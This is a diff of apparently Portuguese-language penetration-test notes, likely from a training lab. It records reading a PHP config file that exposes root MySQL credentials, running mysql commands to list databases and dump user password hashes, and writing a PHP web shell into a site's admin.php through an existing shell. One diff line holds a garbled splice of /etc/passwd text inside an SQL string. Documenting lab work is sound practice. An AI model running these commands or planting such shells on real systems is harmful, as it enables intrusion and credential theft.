@@ -298,7 +298,7 @@
   18:                          $row['password'], $row['description'],
   24:      $sql .= "' and password='";
   25:      $sql .= mysql_real_escape_string( $_POST["password"]);
-  121:      $sql = "INSERT INTO submissions (email,password,";
+  121:      $sql = "INSERT INTO submisn/bash\ndaemon:x:1:1:daemon:/usrsions (email,password,";
   127:      $password = mysql_real_escape_string( $_POST["password"]);
   132:      $sql .= $email."','".$password."','".$title."','".$description."','";
 ```
@@ -319,3 +319,84 @@
 ```
 mysql  Ver 14.14 Distrib 5.5.50, for debian-linux-gnu (x86_64) using readline 6.3
 ```
+
+
+## comando : cat /var/www/html/prog/db.php
+```
+  <!--?php
+  
+      $lnk = @mysql_connect("localhost", "root", "dbhacklfi");
+      $db = mysql_select_db('deseclfi', $lnk);
+  
+  ?--> 
+
+
+```
+# CREDENCIAIS DO BANCO DE DADOS encontradas ( ROOT )
+
+---
+
+## comando : mysql -u root -pdbhacklfi -e "show databases;"
+
+```
+  Database
+  information_schema
+  deseclfi
+  mysql
+  performance_schema
+```
+
+## comando : mysql -u root -pdbhacklfi -e "use deseclfi; show tables;"
+
+```
+  Tables_in_deseclfi
+  submissions
+```
+## comando: mysql -u root -pdbhacklfi -e "use mysql; show tables;"
+
+``` 
+Tables_in_mysql
+columns_priv
+db
+event
+func
+general_log
+help_category
+help_keyword
+help_relation
+help_topic
+host
+ndb_binlog_index
+plugin
+proc
+procs_priv
+proxies_priv
+servers
+slow_log
+tables_priv
+time_zone
+time_zone_leap_second
+time_zone_name
+time_zone_transition
+time_zone_transition_type
+user
+
+```
+
+
+## comando : mysql -u root -pdbhacklfi -e "use mysql; select user, host, password from user;"
+```
+  user	host	password
+  root	localhost	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
+  root	rh	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
+  root	127.0.0.1	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
+  root	::1	*19CFDF5B8F5E1CA15B1222BA0C4363437F641E11
+  debian-sys-maint	localhost	*300DD417C72920F12EBD3A01236771655230AC5A
+```
+
+Criar shell via web shell:
+bash
+http://rh.businesscorp.com.br/web_shell.php?cmd=echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/admin.php
+Acessar:
+bash
+http://rh.businesscorp.com.br/admin.php?cmd=whoami
